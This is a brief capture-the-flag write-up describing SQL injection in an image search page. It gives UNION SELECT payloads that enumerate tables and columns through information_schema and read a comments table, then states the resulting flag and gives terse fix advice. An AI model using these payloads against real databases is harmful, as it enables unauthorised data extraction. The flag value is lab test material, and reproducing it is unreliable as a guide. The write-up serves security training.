
# SQL Injection in search for image

how i found the flag:




## Usage/Examples

```sql
SQL_injection image search :
1_ get table name :
-- 5 UNION SELECT table_name, null FROM information_schema.tables WHERE table_schema = DATABASE() --
2_ get all columns:
-- 5 union all select 5,(column_name) from Information_schema.columns where table_name=0x6C6973745F696D61676573
3_ read comments
-- 5 union all select 5,(comment) from list_images
4_ decode with md5 then sha256 the result to get the flag
-- FLAG: f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
```

## to resolve the patch:

1_ use an ORM (object relational mapping tool) as it check the query befor it send it to server
2_ filter user input